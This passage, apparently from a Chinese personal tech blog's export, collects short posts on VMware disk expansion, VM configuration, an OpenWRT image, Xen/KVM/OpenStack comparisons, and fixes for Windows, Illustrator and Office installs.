<h3 id="7-重新计算逻辑卷"><a href="#7-重新计算逻辑卷" class="headerlink" title="7. 重新计算逻辑卷"></a>7. 重新计算逻辑卷</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@bogon:~<span class="comment"># df -h</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            2.9G  4.0K  2.9G   1% /dev</span><br><span class="line">tmpfs           596M  3.2M  592M   1% /run</span><br><span class="line">/dev/dm-0        19G   16G  1.9G  90% /</span><br><span class="line">none            4.0K     0  4.0K   0% /sys/fs/cgroup</span><br><span class="line">none            5.0M     0  5.0M   0% /run/lock</span><br><span class="line">none            3.0G  4.0K  3.0G   1% /run/shm</span><br><span class="line">none            100M     0  100M   0% /run/user</span><br><span class="line">/dev/sda1       236M   41M  183M  19% /boot</span><br><span class="line"><span class="comment"># 文件系统还没有识别逻辑卷</span></span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br><span class="line">root@bogon:~<span class="comment"># </span></span><br><span class="line"><span class="comment"># 重新计算逻辑卷</span></span><br><span class="line">root@bogon:~<span class="comment"># resize2fs /dev/bogon-vg/root</span></span><br><span class="line">resize2fs 1.42.9 (4-Feb-2014)</span><br><span class="line">Filesystem at /dev/bogon-vg/root is mounted on /; on-line resizing required</span><br><span class="line">old_desc_blocks = 2, new_desc_blocks = 8</span><br><span class="line">The filesystem on /dev/bogon-vg/root is now 31131648 blocks long.</span><br><span class="line"><span class="comment"># 已经可以识别逻辑卷</span></span><br><span class="line">root@bogon:~<span class="comment"># df -lh</span></span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            2.9G  4.0K  2.9G   1% /dev</span><br><span class="line">tmpfs           596M  3.2M  592M   1% /run</span><br><span class="line">/dev/dm-0       117G   16G   97G  14% /</span><br><span class="line">none            4.0K     0  4.0K   0% /sys/fs/cgroup</span><br><span class="line">none            5.0M     0  5.0M   0% /run/lock</span><br><span class="line">none            3.0G  4.0K  3.0G   1% /run/shm</span><br><span class="line">none            100M     0  100M   0% /run/user</span><br><span class="line">/dev/sda1       236M   41M  183M  19% /boot</span><br><span class="line">root@bogon:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>扩容成功！</p>
<p>参考<a href="https://www.cnblogs.com/wangss/p/7954990.html" target="_blank" rel="noopener">【cnblogs.com】</a></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>LVM</tag>
      </tags>
  </entry>
  <entry>
    <title>VMWare安装CHOST</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare%E5%AE%89%E8%A3%85CHOST/</url>
    <content><![CDATA[<p>升级到VM15后，在网上下载Windows7 、 XP的Chost镜像，一直提示“CDBOOT: Couldn’t find BOOTMER”，修改VMWare虚拟机的BIOS第一启动项为CD依然不行。</p>
<p>安装Linux系统（Ubuntu 20.04）却很顺利的。</p>
<p>查看下载的镜像文件，原来是没有boot.ini文件<br><img src="/images/虚拟化技术&amp;云平台/chost_list.png" alt></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>VMWare为Ubuntu添加硬盘</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare%E4%B8%BAUbuntu%E6%B7%BB%E5%8A%A0%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<p>VMWare中的Ubuntu虚拟机当初创建时只分配了20G硬盘，结果现在硬盘爆满了，记得VMWare可以加硬盘的，所以给它加了一块虚拟硬盘，记录一下过程。</p>
<ol>
<li>添加虚拟硬盘</li>
</ol>
<p>VM关机，在“编辑虚拟机设置” 中“硬件”给虚拟机实例添加一块硬盘。</p>
<ol start="2">
<li>开机进入Ubuntu（这里是root身份登录，所以命令没有加sudo）</li>
</ol>
<p>查看所有的硬盘，其中 <code>/dev/sdb</code> 是我们的第二块硬盘。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ fdisk -l</span><br></pre></td></tr></table></figure>
<p><img src="/images/虚拟化技术&amp;云平台/1_fdisk_l.png" alt></p>
<ol start="3">
<li>添加新分区</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ fdisk /dev/sdb</span><br></pre></td></tr></table></figure>
<p><img src="/images/虚拟化技术&amp;云平台/2_fdisk.png" alt></p>
<p>从上到下代表意思：<br>    a. p: 查看当前的分区信息<br>    b. n: 添加新分区<br>    c. p: 选择添加为主分区<br>    d. 三个回车默认：分区编号、分区的开始值、分区的结束值<br>    e. w：保存退出</p>
<ol start="4">
<li>查看系统设备</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ls /dev/</span><br></pre></td></tr></table></figure>
<p><img src="/images/虚拟化技术&amp;云平台/3_dev.png" alt></p>
<p><code>/dev/sdb1</code> 就是新分区设备（编号默认1）</p>
<ol start="5">
<li>格式化新分区设备</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs -t ext3 /dev/sdb1</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>开机挂载新分区为/data</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新增一行</span></span><br><span class="line">/dev/sdb1 /data ext3 defaults 0 0</span><br></pre></td></tr></table></figure>
<p>备注：ext3 、ext4 文件格式都可以。</p>
<ol start="7">
<li>重启看下是否挂载了新分区为/data</li>
</ol>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare,添加硬盘</tag>
      </tags>
  </entry>
  <entry>
    <title>VMWare虚拟机进BIOS</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%9BBIOS/</url>
    <content><![CDATA[<p>很简单，将虚拟机关机，在菜单栏“启动”绿色按钮旁边的更多三角形按钮，可以看到最底下有一个选项“打开电源时进入固件”，点击就可以进入BIOS啦。</p>
<p><img src="/images/虚拟化技术&amp;云平台/vm-bios.jpg" alt></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>VMWare资源配置</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMWare%E8%B5%84%E6%BA%90%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p>现在普通的CPU都是有4核，在VM中如何配置虚拟机的CPU呢？</p>
<p>个人推荐是 <code>CPU数量 * 核心 = X倍的内存</code></p>
<p>2个CPU * 每个CPU2核 =  4核 ，这时候最好给8G以上内存。<br><img src="/images/虚拟化技术&amp;云平台/处理器总核数.png" alt></p>
<p>比如：<br><img src="/images/虚拟化技术&amp;云平台/CPU内存推荐配置.png" alt></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware安装OpenWRT</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/VMware%E5%AE%89%E8%A3%85OpenWRT/</url>
    <content><![CDATA[<p>VMware上安装OpenWRT的方法很多种，推荐：</p>
<ol>
<li>通过源码编译vmdk磁盘文件，<a href="https://blog.csdn.net/a13698709128/article/details/78159833" target="_blank" rel="noopener">【教程】</a>。</li>
<li>通过下载官方的img镜像，转换为vmdk磁盘文件，<a href="https://cokebar.info/archives/2444" target="_blank" rel="noopener">【教程】</a>。</li>
<li>直接下载vm镜像，开箱即用，但是安全性不高，<a href="https://github.com/luoqeng/OpenWrt-on-VMware" target="_blank" rel="noopener">【教程】</a>。</li>
</ol>
<p>我比较懒，就用开箱即用试了一下。</p>
<p><a href="https://github.com/luoqeng/OpenWrt-on-VMware/releases/download/v18.06.2/openwrt-18.06.2.tar.gz" target="_blank" rel="noopener">【下载地址】</a>下载了一个，解压之后只要一个VM的配置文件和VM磁盘文件。<br>用VM打开，启动提示其他版本VM创建，修改配置文件，把 <code>virtualHW.version</code>的值改为自己的版本，重新启动。</p>
<p><img src="/images/linux/openwrt.png" alt></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ifconfig -a</span><br></pre></td></tr></table></figure>
<p>看到它的IP是 <code>192.168.0.120</code>,在浏览器访问，就能看到OpenWRT的Web登录界面。<br>默认登录账号是 <code>root</code>，密码不知道。<br><img src="/images/linux/openwrt-login.png" alt></p>
<p>直接在虚拟机终端修改root的密码:<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ passwd root</span><br></pre></td></tr></table></figure></p>
<p>重新登录Web<br><img src="/images/linux/openwrt_web.png" alt></p>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare,OpenWRT</tag>
      </tags>
  </entry>
  <entry>
    <title>CCMarker使用记录</title>
    <url>/%E9%9A%8F%E7%AC%94/CCMarker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p><img src="/images/ccmarker/1.jpg" alt><br><img src="/images/ccmarker/2.png" alt><br><img src="/images/ccmarker/3.jpg" alt><br><img src="/images/ccmarker/4.png" alt><br><img src="/images/ccmarker/5.png" alt><br><img src="/images/ccmarker/6.png" alt="缺少VC++错误"></p>
<h2 id="无法下载"><a href="#无法下载" class="headerlink" title="无法下载"></a>无法下载</h2><p>这是网络原因，目前实测家庭网络可以下载，速度非常快，都是直接从官方的CDN下载。<br><img src="/images/ccmarker/CCMaker_ERR.png" alt="网络错误"></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>ccmarker</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟化平台对比</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%B9%B3%E5%8F%B0%E5%AF%B9%E6%AF%94/</url>
    <content><![CDATA[<p>本文只对比：KVM、Xen、VMWare</p>
<h3 id="VMWare"><a href="#VMWare" class="headerlink" title="VMWare"></a>VMWare</h3><p>VMWare是一个成熟的商业软件，市场占有率很高，但是操作系统安装在VMWare上面比直接装硬件上性能低不少，所以它比较适合学习和测试。</p>
<p>仿真虚拟化：对系统硬件没有要求，性能低。</p>
<h3 id="Xen"><a href="#Xen" class="headerlink" title="Xen"></a>Xen</h3><blockquote>
<p>Xen在2013年时就使用过，13年那时候跟着老大在机房装Xen，然后跑了几台CentOS做TCP长连接测试，当时不懂事，不明白它存在的价值，以为它就是类似VMWare的软件，只不过Xen是开源软件，和VirtualBox差不多。</p>
</blockquote>
<p><a href="https://xenproject.org/" target="_blank" rel="noopener">Xen</a> 是英国剑桥大学计算机实验室开发的一个虚拟化开源项目，是一个Hypervisor程序（虚拟机管理程序），XEN 可以在一套物理硬件上安全的执行多个虚拟机，它和操作平台结合的极为密切，占用的资源最少。</p>
<p>Xen支持半虚拟化和全虚拟化，性能比VMWare好很多，在其官网可见，亚马逊云、阿里云、华为云等都是 <code>Xen Project</code> 的会员。</p>
<p>国内比较早的云服务商（如阿里云）都是使用Xen，REHL5默认自带Xen，但是后来KVM发展起来了，现在主流都采用KVM。</p>
<p>半虚拟化（早期Xen只支持半虚拟化）：虚拟机可以使用物理机硬件，性能高，但是需要改内核，虚拟机内只能安装和物理机一样的系统。</p>
<h3 id="KVM"><a href="#KVM" class="headerlink" title="KVM"></a>KVM</h3><p>KVM 全称是 基于内核的虚拟机（Kernel-based Virtual Machine），它由以色列公司 <code>Quramnet</code> 开发，该公司于 2008年被 <code>RedHat</code> 收购，KVM 是开源的，它被Linux核心组织放入Linux的内核里面，作为Linux 的一个内核模块（Linux 2.6.20及以上版本），KVM主打的就是高性能、扩展性、高安全，以及低成本。所以KVM对Xen的优势很大，加上RedHat等公司大力投入，KVM发展很快，现在基本上已成为主流。</p>
<p>目前的云服务商的产品都转向KVM了，RHEL6开始抛弃Xen，自带自家的KVM，详细可以看文章<a href="../../Linux/Linux查看主机使用哪种虚拟化平台">《Linux查看使用哪种虚拟化平台》</a></p>
<p>全虚拟化：直接使用物理硬件，性能最高，而且可以运行其他系统，如Windows。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a href="https://zhuanlan.zhihu.com/p/33324585" target="_blank" rel="noopener">Xen V.S. KVM终于画上了一个完美的句号</a></li>
<li><a href="http://server.zol.com.cn/586/5869108.html" target="_blank" rel="noopener">科普：KVM与XEN虚拟化环境究竟有何不同？</a></li>
<li><a href="https://www.cnblogs.com/sammyliu/p/4543110.html" target="_blank" rel="noopener">KVM 介绍</a></li>
<li><a href="https://blog.51cto.com/arkling/2310929" target="_blank" rel="noopener">虚拟化及Xen和KVM介绍</a></li>
<li><a href="https://www.cnblogs.com/sammyliu/articles/4389981.html" target="_blank" rel="noopener">虚拟化 - KVM 和 Xen 比较</a></li>
</ul>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>KVM,Xen,VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次VMWare的vcpu-0错误</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/%E8%AE%B0%E4%B8%80%E6%AC%A1VMWare%E7%9A%84vcpu-0%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<p>环境：Windows10下在WM中安装Linux<br>错误信息大概如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcpu-0:VERIFY vmcore/vmm/main/cpuid.c:382 bugNr=1036521</span><br></pre></td></tr></table></figure></p>
<p>本来vm一直在正常运行，发生这次错误是在电脑（Windows10）的一次不正常关机（断电）之后。</p>
<p>cpu的相关设置记得没有改，vm有些功能是需要电脑开启虚拟cpu技术的（<code>Intel virtual technology</code>），这在装wm的系统时已经开启过了，估计电脑不正常关机导致恢复默认值了。</p>
<p>在BIOS中找到 <code>Intel virtual technology</code>，将其设置为<code>ENABLE</code>就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注：这个问题是Intel virtual technology没开启导致的，所以在新安装VM的时候也会出现。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>VMWare</tag>
      </tags>
  </entry>
  <entry>
    <title>Illustrator启动CANT错误</title>
    <url>/%E9%9A%8F%E7%AC%94/Illustrator%E5%90%AF%E5%8A%A8CANT%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在Windows10上家庭版安装完 Illustrator x64 ，在启动时崩溃并显示 CANT 错误的问题。</p>
<p>经过查资料，定位到是 <code>Microsoft Visual C++ Redistributable</code> 这个库的问题。</p>
<p>转到 <code>控制面板 &gt; 程序 &gt; 程序和功能</code>，发现我的系统中， <code>Microsoft Visual C++ Redistributable 2012</code> 这个库只有x86的，没有x64的，而安装的Illustrator是x64的。</p>
<p>找到问题了，那就好办了。</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol>
<li>先下载<a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=30679" target="_blank" rel="noopener">VC++ 2012 x64</a>安装。</li>
<li>删除文件夹： <code>用户名 &gt; App Data &gt; Roaming &gt; Adobe &gt; Adobe Illustrator  version-number Settings</code> 。</li>
<li>重启电脑，OK！</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Illustrator的增效工具依赖于Visual C++，而且是依赖 <code>Visual C++的 2012~2017版本</code> ，假如有些电脑缺少 <code>VC ++ 2013</code> ，就需要安装<code>VC ++ 2013</code>，微软的官网有所有的VC++版本，地址：<br><a href="https://support.microsoft.com/zh-cn/topic/%E6%9C%80%E6%96%B0%E6%94%AF%E6%8C%81%E7%9A%84-visual-c-%E4%B8%8B%E8%BD%BD-2647da03-1eea-4433-9aff-95f26a218cc0" target="_blank" rel="noopener">【最新支持的 Visual C++ 下载】</a><br><img src="/images/随笔/程序VC++依赖库.png" alt></p>
<h2 id="资料：启动时崩溃-缺少增效工具"><a href="#资料：启动时崩溃-缺少增效工具" class="headerlink" title="资料：启动时崩溃 | 缺少增效工具"></a>资料：启动时崩溃 | 缺少增效工具</h2><p>遇到 Illustrator 在启动时崩溃并显示缺少增效工具错误或 CANT 错误的问题？请按照下面提到的解决方法进行操作。</p>
<ol>
<li>转到控制面板 &gt; 程序 &gt; 程序和功能。</li>
<li>右键单击 Microsoft Visual C++ Redistributable (2012~2017)，然后选取修复。</li>
<li>重置 Illustrator 首选项。Illustrator 首选项文件位于以下位置：<br>[Windows] 用户名 &gt; App Data &gt; Roaming &gt; Adobe &gt; Adobe Illustrator  version-number Settings<br>[macOS] /用户/&lt;用户名&gt;/资源库/Preferences/Adobe Illustrator 24 Settings</li>
<li>重新启动计算机，然后打开 Illustrator。</li>
</ol>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>Illustrator,AI</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10微软应用商店无法加载页面</title>
    <url>/%E9%9A%8F%E7%AC%94/Win10%E5%BE%AE%E8%BD%AF%E5%BA%94%E7%94%A8%E5%95%86%E5%BA%97%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E9%A1%B5%E9%9D%A2/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Win10微软商店无法加载页面，错误码：0x80131500<br><img src="/images/随笔/微软商店错误.png" alt></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol>
<li><code>WINDOWS</code> + <code>R</code> 键，输入 <code>inetcpl.cpl</code></li>
<li>打开 <code>TLS 1.2</code> 选项</li>
<li>应用或者确定</li>
</ol>
<p><img src="/images/随笔/微软商店TLS设置.png" alt></p>
<h2 id="重新打开微软应用商店"><a href="#重新打开微软应用商店" class="headerlink" title="重新打开微软应用商店"></a>重新打开微软应用商店</h2><p><img src="/images/随笔/微软商店OK.png" alt></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>初识OpenStack</title>
    <url>/%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF&amp;%E4%BA%91%E5%B9%B3%E5%8F%B0/%E5%88%9D%E8%AF%86OpenStack/</url>
    <content><![CDATA[<h3 id="什么是-OpenStack"><a href="#什么是-OpenStack" class="headerlink" title="什么是 OpenStack"></a>什么是 <a href="https://www.openstack.org" target="_blank" rel="noopener">OpenStack</a></h3><blockquote>
<p>官网介绍：<br>OpenStack is a cloud operating system that controls large pools of compute, storage, and networking resources throughout a datacenter, all managed and provisioned through APIs with common authentication mechanisms.<br>A dashboard is also available, giving administrators control while empowering their users to provision resources through a web interface.<br>Beyond standard infrastructure-as-a-service functionality, additional components provide orchestration, fault management and service management amongst other services to ensure high availability of user applications.<br>有道翻译：<br>OpenStack是一个云操作系统，它控制整个数据中心中的大量计算、存储和网络资源，所有这些资源都是通过具有公共身份验证机制的api管理和供应的。<br>还提供了一个仪表板，让管理员控制，同时授权用户通过web界面提供资源。<br>除了标准的基础设施即服务功能之外，其他组件还提供编排、故障管理和服务管理，以确保用户应用程序的高可用性。</p>
</blockquote>
<p><img src="/images/虚拟化技术&amp;云平台/openstack.svg" alt></p>
<p>Openstack最初是由NASA和Rackspace在2010年共同发起的一个开源的云计算平台项目，目前项目正在被 Reahat、IBM、AMD、Intel、戴尔、思科、微软等超过一百家厂商共同研发，目前国内对于云计算的需求也逐渐增加，华胜天成、高德地图、京东、阿里巴巴、百度、中兴、华为等中国企业也加入到了Openstack项目研发当中，Openstack项目也正在随着全球内得到了众多厂商的参与支持而快速成熟。</p>
<blockquote>
<p>OpenStack 是一系列开源工具（或开源项目）的组合，主要使用池化虚拟资源来构建和管理私有云及公共云。其中的六个项目主要负责处理核心云计算服务，包括计算、网络、存储、身份和镜像服务。还有另外十多个可选项目，用户可把它们捆绑打包，用来创建独特、可部署的云架构。</p>
</blockquote>
<blockquote>
<p>试想一下，在 虚拟化环境中，诸如存储、CPU 和 RAM 等资源都是从诸多供应商特定的项目中提取出来，然后由虚拟机监控程序进行拆分并按需进行分配。OpenStack 使用一组一致的应用编程接口（API），进一步将这些虚拟资源提取为离散池，用于辅助标准云计算工具，供管理员和用户直接交互使用。</p>
</blockquote>
<blockquote>
<p>OpenStack 实际上由一系列叫作脚本的命令组成。这些脚本会被捆绑到名为项目的软件包中，这些软件包则用于传递创建云环境的任务。<br>为了创建这些环境，OpenStack 还会使用 2 种其他类型的软件：</p>
</blockquote>
<blockquote>
<ul>
<li>虚拟化软件，用于创建从硬件中抽象出来的虚拟资源层</li>
<li>基础操作系统（OS），用于执行 OpenStack 脚本发出的命令</li>
</ul>
</blockquote>
<blockquote>
<p><strong>你可以这样理解</strong>：OpenStack 本身不会虚拟化资源，但会使用虚拟化资源来构建云。OpenStack 也不执行命令，但会将命令转发到基础 OS。OpenStack、虚拟化软件和基础操作系统，这 3 种技术必须协同工作。正是由于这种相互依赖性，所以许多人才会使用 Linux® 来部署 OpenStack 云，也因此，RackSpace 和 NASA 才会将 OpenStack 作为开源软件来发布。</p>
</blockquote>
<h3 id="OpenStack-解决什么问题"><a href="#OpenStack-解决什么问题" class="headerlink" title="OpenStack 解决什么问题"></a>OpenStack 解决什么问题</h3><p>管理虚拟化软件， OpenStack 几乎支持所有的虚拟化管理程序，不论是开源的 Xen 与 KVM 还是厂商的（Hyper-V与VMware），如果在一两台机安装 Xen 与 KVM，那没什么问题，如果有大量的机器，那管理是不是很麻烦？除了要安装操作系统，还需要管理网络，磁盘等等！</p>
<p>OpenStack 就是解决这些管理问题，通俗的讲，OpenStack 是可以为你提供一个类似 <code>亚马逊控制台</code>的东西，假如一些大企业不使用 <code>亚马逊云ES</code>或者<code>阿里云ESC</code>等公有云，自己搭建机房和云平台（私有云），那么 OpenStack 可以帮助企业管理云，它主要的目标是简化资源的管理和分配。</p>
<h3 id="OpenStack-中有哪些项目？"><a href="#OpenStack-中有哪些项目？" class="headerlink" title="OpenStack 中有哪些项目？"></a>OpenStack 中有哪些项目？</h3><p>OpenStack用Python写的，包含很多组件，类似DIY一台PC机一样。</p>
<blockquote>
<p>OpenStack 架构由大量开源项目组成。其中包含 6 个稳定可靠的核心服务，用于处理计算、网络、存储、身份和镜像； 同时，还为用户提供了十多种开发成熟度各异的可选服务。OpenStack 的 6 个核心服务主要担纲系统的基础架构，其余项目则负责管理控制面板、编排、裸机部署、信息传递、容器及统筹管理等操作。</p>
</blockquote>
<ol>
<li>Nova 是一个完整的 OpenStack 计算资源管理和访问工具，负责处理规划、创建和删除操作。</li>
<li>Neutron 能够连接其他 OpenStack 服务并连接网络。</li>
<li>Swift 是一种高度容错的对象存储服务，使用 RESTful API 来存储和检索非结构数据对象。</li>
<li>Cinder 通过自助服务 API 访问持久块存储。</li>
<li>Keystone 认证所有 OpenStack 服务并对其进行授权。同时，它也是所有服务的端点目录。</li>
<li>Glance 可存储和检索多个位置的虚拟机磁盘镜像。</li>
</ol>
<h3 id="OpenStack-安装部署繁琐"><a href="#OpenStack-安装部署繁琐" class="headerlink" title="OpenStack 安装部署繁琐?"></a>OpenStack 安装部署繁琐?</h3><p>安装官网资料，OpenStack的安装时简单的，具体可以看 《参考资料：使用openstack部署云计算服务环境》，该文完全的演示了如何在Openstack软件中配置虚拟网络、创建主机实例模板、创建云主机实例、添加及挂载云硬盘等操作。</p>
<h3 id="外界的评价如何？"><a href="#外界的评价如何？" class="headerlink" title="外界的评价如何？"></a>外界的评价如何？</h3><p>外界对OpenStack的评价可不太好，甚至有一种声音为：OpenStack已死。为什么会有这种声音？</p>
<p>先看一下OpenStack的历史：</p>
<p>2010年，NASA和Rackspace公司将其开源。<br>2012年，NASA停止OpenStack研发。<br>2015年，Rackspace宣布将客户业务迁移到AWS。<br>…<br>…</p>
<p>虽然国外很多大厂都放弃OpenStack，但国内OpenStack的热度还是很好的，总的来说，OpenStack入门门槛还是比较低的，普通的运维估计都能搞定。<br><a href="https://www.zhihu.com/question/31555138" target="_blank" rel="noopener">知乎：Openstack和阿里云、AWS、AZURE等的竞争发展趋势分析？</a><br><a href="https://www.infoq.cn/article/Z8p-Se31uh0NrLNHt5BT" target="_blank" rel="noopener">放弃 OpenStack？恐怕还不到时候</a></p>
<h3 id="国内哪些大厂在用OpenStack？"><a href="#国内哪些大厂在用OpenStack？" class="headerlink" title="国内哪些大厂在用OpenStack？"></a>国内哪些大厂在用OpenStack？</h3><p>网上说腾讯和华为云起步的比较晚，都是基于OpenStack的。</p>
<p>AWS最早的模型在2002年就出现了，2006年正式上线。Google的GAE最早是 2008 年出现，比亚马逊晚了起码两年。阿里云也是在2008年开始的，其飞天云系统2009年上线，而openstack是2010年开始开源的。</p>
<p>所以在<a href="https://yq.aliyun.com/articles/596164" target="_blank" rel="noopener">2018年5月23日云栖大会</a>上阿里云总裁胡晓明表示：“坚持自主研发之路，“‘拿来主义’盖不出高楼大厦，自主研发的云才能走得更远”。</p>
<p>多年发展之后，中国云计算行业呈现出两种发展路径：一种是从底层开始自主研发操作系统，比如阿里云的飞天；一种是基于OpenStack等第三方软件搭建。自主研发通常需要投入巨量的人、财、物，短期看不到成功，遇到多方质疑仍要坚持初心，是典型的“Hard模式”。亚马逊的AWS、微软的Azure、阿里巴巴的阿里云等全球最大的三朵云都是自主研发。</p>
<p><img src="/images/虚拟化技术&amp;云平台/两种云.png" alt><br><img src="/images/虚拟化技术&amp;云平台/拿来云.png" alt></p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
<li><a href="https://www.linuxprobe.com/chapter-22.html" target="_blank" rel="noopener">使用openstack部署云计算服务环境</a></li>
<li><a href="https://www.cnblogs.com/wangle1001986/p/5320752.html" target="_blank" rel="noopener">OpenStack与KVM的区别与联系</a></li>
<li><a href="https://www.redhat.com/zh/topics/openstack" target="_blank" rel="noopener">Redhat:了解 OpenStack</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/64272970" target="_blank" rel="noopener">OpenStack，冰火两重天？</a></li>
<li><a href="http://www.yunweipai.com/archives/23516.html" target="_blank" rel="noopener">腾讯成OpenStack基金会黄金会员</a></li>
<li><a href="https://www.infoq.cn/article/ZpACbRrJgsB_61sQX2rq" target="_blank" rel="noopener">2018 年 OpenStack 用户调查报告</a></li>
<li><a href="https://yq.aliyun.com/articles/596164" target="_blank" rel="noopener">“拿来主义”盖不起高楼大厦</a></li>
</ul>
]]></content>
      <categories>
        <category>虚拟化技术&amp;云平台</category>
      </categories>
      <tags>
        <tag>KVM,Xen,OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10安装Office2019专业增强版自定义选择安装组件</title>
    <url>/%E9%9A%8F%E7%AC%94/Win10%E5%AE%89%E8%A3%85Office2019%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%88%E8%87%AA%E5%AE%9A%E4%B9%89%E9%80%89%E6%8B%A9%E5%AE%89%E8%A3%85%E7%BB%84%E4%BB%B6/</url>
    <content><![CDATA[<p>零售版Office2019增强版是一个iso安装包，安装的时候不可以自定义安装组件，默认直接全部组件都安装上，我们一般只用到三大组件：Word、Excel、PPT，其他多余的：Sky，Access，Pusher，Outlook等组件想删掉又删不掉。</p>
<p>所以网上找了一下方法，可以自定义安装组件，而且是可以直接从微软的官网CDN直接下载安装，下载速度也不错。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol>
<li><a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117" target="_blank" rel="noopener">下载【officedeploymenttool.exe】</a></li>
<li>运行 【officedeploymenttool.exe】 导出 【setup.exe】，其他xml文件不要，可以删除。</li>
<li><a href="https://config.office.com/deploymentsettings" target="_blank" rel="noopener">在线 Office 自定义工具</a><br> 这个网页可以生成一个配置文件，可以选择版本、组件等，我们也可以根据模板手动修改。<ul>
<li>情况一(推荐)：配置在线CDN下载（cdn_config.xml）； <ul>
<li>情况二：如果已经下载了Vol安装包（只支持Vol批量授权版，零售版不支持），所以选择本地源，选择你的Vol安装包路径（F:\）。<br>配置导出为local_config.xml文件。</li>
</ul>
</li>
</ul>
</li>
<li>配置文件中的<code>&lt;ExcludeApp/&gt;</code>标签就是要排除的组件，排除掉 Sky，Access，Pusher，Outlook等,只留下Word、Excel、PPT 和 OneNote，可以自己手动修改这个文件。</li>
<li>执行安装<ul>
